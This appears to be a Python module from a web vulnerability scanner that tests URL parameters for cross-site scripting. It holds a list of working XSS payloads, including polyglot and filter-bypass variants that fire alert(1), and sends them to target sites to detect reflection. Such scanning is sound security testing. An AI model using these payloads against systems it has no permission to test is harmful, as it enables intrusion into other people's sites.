"""
XSS (Cross-Site Scripting) Scanner Module
Tests for reflected, stored, and DOM-based XSS vulnerabilities
"""

import re
import hashlib
from typing import List, Dict

class XSSScanner:
    """Smart XSS vulnerability scanner"""

    def __init__(self, parent_scanner):
        self.scanner = parent_scanner
        self.name = "XSS Scanner"
        self.payloads = self.generate_smart_xss_payloads()

    def generate_smart_xss_payloads(self) -> List[Dict]:
        """Generate smart XSS test payloads with context"""
        payloads = [
            # Basic XSS
            {
                'payload': '<script>alert(1)</script>',
                'context': 'html',
                'detection': r'<script>alert\(1\)</script>'
            },
            {
                'payload': '<img src=x onerror=alert(1)>',
                'context': 'html',
                'detection': r'<img.*onerror=alert\(1\)'
            },
            {
                'payload': '<svg/onload=alert(1)>',
                'context': 'html',
                'detection': r'<svg.*onload=alert\(1\)'
            },

            # Encoded XSS
            {
                'payload': '<script>alert(String.fromCharCode(88,83,83))</script>',
                'context': 'html',
                'detection': r'<script>alert\(String\.fromCharCode'
            },

            # Attribute-based XSS
            {
                'payload': '" onmouseover="alert(1)',
                'context': 'attribute',
                'detection': r'onmouseover=["\']?alert\(1\)'
            },
            {
                'payload': "' autofocus onfocus=alert(1) x='",
                'context': 'attribute',
                'detection': r'onfocus=alert\(1\)'
            },

            # JavaScript context
            {
                'payload': "';alert(1);//",
                'context': 'javascript',
                'detection': r"';alert\(1\);"
            },
            {
                'payload': '</script><script>alert(1)</script>',
                'context': 'javascript',
                'detection': r'</script><script>alert\(1\)'
            },

            # Polyglot payloads
            {
                'payload': 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//\\x3e',
                'context': 'polyglot',
                'detection': r'alert\(1\)'
            },

            # DOM-based XSS
            {
                'payload': '#<img src=x onerror=alert(1)>',
                'context': 'dom',
                'detection': r'<img.*onerror=alert\(1\)'
            },

            # Filter bypass
            {
                'payload': '<img src="x" onerror="alert`1`">',
                'context': 'html',
                'detection': r'onerror=["\']?alert'
            },
            {
                'payload': '<iframe srcdoc="<script>alert(1)<\/script>">',
                'context': 'html',
                'detection': r'<iframe.*srcdoc.*alert\(1\)'
            },
        ]

        return payloads

    def check_reflection(self, payload_dict: Dict, response_text: str) -> bool:
        """Check if payload is reflected in response"""
        payload = payload_dict['payload']
        detection = payload_dict['detection']

        # Check for exact reflection
        if payload in response_text:
            return True

        # Check with regex pattern
        if re.search(detection, response_text, re.IGNORECASE):
            return True

        return False

    def analyze_context(self, response_text: str, marker: str) -> str:
        """Analyze the context where input is reflected"""
        # Find where the marker appears
        index = response_text.find(marker)
        if index == -1:
            return 'unknown'

        # Get surrounding context
        start = max(0, index - 100)
        end = min(len(response_text), index + 100)
        context = response_text[start:end]

        # Determine context type
        if re.search(r'<script[^>]*>.*' + re.escape(marker), context, re.IGNORECASE | re.DOTALL):
            return 'javascript'
        elif re.search(r'<[^>]+\s+\w+=["\']?[^"\']*' + re.escape(marker), context):
            return 'attribute'
        elif re.search(r'<style[^>]*>.*' + re.escape(marker), context, re.IGNORECASE | re.DOTALL):
            return 'css'
        else:
            return 'html'

    def test_parameter(self, url: str, param: str, value: str) -> List[Dict]:
        """Test a single parameter for XSS"""
        vulnerabilities = []

        # Generate unique marker
        marker = hashlib.md5(f"{url}{param}".encode()).hexdigest()[:8]

        # Test marker reflection first
        resp = self.scanner.smart_request(url, params={param: marker})
        if not resp or marker not in resp.text:
            return vulnerabilities  # Parameter not reflected

        # Analyze reflection context
        context = self.analyze_context(resp.text, marker)

        # Test relevant payloads based on context
        tested_payloads = [p for p in self.payloads if p['context'] in [context, 'polyglot']]

        for payload_dict in tested_payloads[:15]:  # Limit requests
            test_resp = self.scanner.smart_request(url, params={param: payload_dict['payload']})

            if not test_resp:
                continue

            if self.check_reflection(payload_dict, test_resp.text):
                vulnerabilities.append({
                    'type': f'Cross-Site Scripting (XSS) - {context.upper()} context',
                    'severity': 'HIGH',
                    'url': url,
                    'parameter': param,
                    'payload': payload_dict['payload'],
                    'description': f'XSS vulnerability in parameter "{param}" with {context} context',
                    'evidence': self.extract_reflection(test_resp.text, payload_dict['payload'])
                })
                break  # Found XSS, no need to test more

        return vulnerabilities

    def extract_reflection(self, text: str, payload: str) -> str:
        """Extract the reflected payload from response"""
        index = text.find(payload)
        if index != -1:
            start = max(0, index - 50)
            end = min(len(text), index + len(payload) + 50)
            return text[start:end].replace('\n', ' ')
        return "Payload reflected in response"

    def scan(self) -> List[Dict]:
        """Scan for XSS vulnerabilities"""
        vulnerabilities = []

        from urllib.parse import urlparse, parse_qs

        parsed = urlparse(self.scanner.target)
        params = parse_qs(parsed.query)

        if not params:
            # Try common parameters
            test_params = ['q', 'search', 'query', 'keyword', 'name', 'comment', 'message']
            for param in test_params:
                test_url = f"{self.scanner.target}?{param}=test"
                resp = self.scanner.smart_request(test_url)
                if resp and resp.status_code == 200 and 'test' in resp.text:
                    vulns = self.test_parameter(self.scanner.target, param, 'test')
                    vulnerabilities.extend(vulns)
        else:
            # Test existing parameters
            for param, values in params.items():
                value = values[0] if values else 'test'
                vulns = self.test_parameter(self.scanner.target, param, value)
                vulnerabilities.extend(vulns)

        return vulnerabilities
